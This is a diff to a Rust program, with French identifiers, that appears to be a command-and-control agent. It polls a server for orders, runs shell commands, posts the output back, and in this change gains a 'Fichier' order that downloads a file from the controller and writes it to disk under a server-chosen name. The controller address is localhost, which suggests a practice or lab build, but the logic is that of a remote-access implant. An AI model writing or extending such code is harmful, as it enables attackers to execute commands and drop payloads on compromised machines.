@@ -4,6 +4,8 @@ use std::time::Duration;
 use std::{thread, time};
 use std::process::{Command, Output};
 use std::io::Write;
+use std::io::Cursor;
+use bytes::Bytes;
 use reqwest::{self, Result};
 use serde::{Serialize, Deserialize};
 
@@ -29,6 +31,7 @@ fn exec_commande_shell(command : String, args : Vec<String>) -> std::io::Result<
 #[derive(Serialize, Deserialize, Debug)]
 enum OrdreType {
     Commande,
+    Fichier,
     Endormir,
     Autre
 }
@@ -77,6 +80,21 @@ async fn sending_request() -> std::io::Result<()>{
                                         Err(_) => println!("erreur")
                                     };
                                 },
+                                OrdreType::Fichier => {
+                                    let filename = v.arguments[0].clone();
+                                    let mut file = std::fs::File::create(filename)?;
+                                    
+                                    let content = send_file_post_request().await;
+                                    match content {
+                                        Ok(v) => {
+                                            let mut content = Cursor::new(v);
+                                            std::io::copy(&mut content, &mut file);
+                                        },
+                                        Err(_) => {
+                                            panic!("Cannot receive file content !")
+                                        }
+                                    }
+                                }
                                 _ => {
                                     println!("Ordre non implémenté");
                                 }
@@ -108,6 +126,37 @@ async fn sending_request() -> std::io::Result<()>{
     return Ok(());
 }
 
+
+
+async fn send_file_post_request() -> Result<Bytes> {
+
+    let client = reqwest::Client::new();
+    let response = client.post("http://127.0.0.1:8082")
+    .send()
+    .await;
+
+    match response{
+        Ok(v) => {
+            match v.status() {
+                reqwest::StatusCode::OK => {
+                    println!("file : Success!");
+
+                    let bytes = v.bytes().await.unwrap();
+                    return Ok(bytes);
+
+                },
+                _ => {
+                    panic!("Uh oh! Something unexpected happened.");
+                }
+            };
+        },
+        Err(e) => return Err(e)
+    };
+}
+
+
+
+
 // fn sending_request_with_result(result_command : Command) -> std::io::Result<()>{
 //     let mut stream = TcpStream::connect("127.0.0.1:7878")?;
 //     stream.write(&[1])?;
@@ -125,7 +174,6 @@ async fn sending_request() -> std::io::Result<()>{
 //     headers
 // }
 
-// #[tokio::main]
 async fn sending_request_with_result(result_command : Output) -> std::io::Result<()> {
     let client = reqwest::Client::new();
     let response = client.post("http://127.0.0.1:8082")
